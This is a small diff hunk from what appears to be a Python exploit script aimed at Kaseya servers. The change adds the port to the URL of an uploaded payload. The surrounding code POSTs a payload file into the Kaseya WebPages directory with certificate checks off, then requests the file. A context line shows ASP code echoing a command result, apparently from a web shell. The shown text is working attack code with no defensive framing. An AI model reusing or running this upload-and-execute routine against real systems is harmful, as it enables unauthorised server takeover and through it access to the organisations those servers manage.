@@ -62,7 +62,7 @@ response.write replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>")
         r = self.session.post(url, params=params, headers=headers, cookies=cookies, data=self.payload, proxies=self.proxy, verify=False)
 
         if r.status_code == 200:
-            url = "{}://{}/{}{}".format(self.proto, self.targetHost, unquote(self.pathData.replace("C%3A%5CKaseya%5CWebPages%5C","")),self.payloadFilename)
+            url = "{}://{}:{}/{}{}".format(self.proto, self.targetHost, self.port, unquote(self.pathData.replace("C%3A%5CKaseya%5CWebPages%5C","")), self.payloadFilename)
             print ("File uploaded, please check: {}".format(url) )
             if self.payload == self.genericPayload():
                 resp = self.session.get(url, headers=headers, proxies=self.proxy, verify=False)
